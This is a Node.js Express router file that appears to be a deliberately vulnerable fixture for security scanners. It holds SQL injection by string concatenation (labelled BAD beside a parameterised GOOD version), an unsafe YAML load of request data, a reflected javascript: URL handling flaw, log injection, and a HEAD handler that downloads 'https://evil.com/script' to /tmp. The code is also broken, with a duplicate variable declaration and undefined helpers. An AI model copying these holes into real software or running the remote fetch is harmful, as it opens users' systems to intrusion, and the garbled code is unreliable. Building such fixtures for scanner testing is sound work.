var utils = require('./user');

var express = require('express')
var typeorm = require("typeorm");
var https = require("https");
var fs = require("fs");


const pg = require('pg');
const pool = new pg.Pool(config);

const jsyaml = require("js-yaml");


var router = express.Router()
module.exports = router

router.get('/', async (req, res, next) => {

  const mongoConnection = typeorm.getConnection('mysql')
  const repo = mongoConnection.getRepository("Users")

  // hard-coded getting account id of 1
  // as a rpelacement to getting this from the session and such
  // (just imagine that we implemented auth, etc)
  const results = await repo.find({ id: 1 })

  // Log Object's where property for debug reasons:
  console.log('The Object.where property is set to: ', {}.where)
  console.log(results)

  return res.json(encode(results))

})

router.head('/', async (req, res, next) => {
  // BAD: the category might have SQL special characters in it
  var query1 = "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='"
             + req.params.category + "' ORDER BY PRICE";
  pool.query(query1, [], function(err, results) {
    // process results
  });

  // GOOD: use parameters
  var query2 = "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1"
             + " ORDER BY PRICE";
  pool.query(query2, [req.params.category], function(err, results) {
      // process results
  });
  https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});

  return res.json()
})


router.post('/', async (req, res, next) => {
  try {
    const mongoConnection = typeorm.getConnection('mysql')
    const repo = mongoConnection.getRepository("Users")

    const user = {}
    user.name = req.body.name
    user.address = req.body.address
    user.role = req.body.role

    const u = decodeURI(req.url).trim().toLowerCase();
    if (u.startsWith("javascript:"))
        res.append("wow");
    
    var u = decodeURI(req.url).trim().toLowerCase();
    if (u.startsWith("javascript:"))
            res.append( "about:blank");
    res.append( u);

    var data = jsyaml.load(req.params.data);
    
    const savedRecord = await repo.save(user)
    console.log("Post has been saved: ", savedRecord)
    console.log("Unauthorized access attempt by " + data, data)
    
    return res.sendStatus(200)

  } catch (err) {
    console.error(err)
    console.log({}.where)
    next();
  }
})
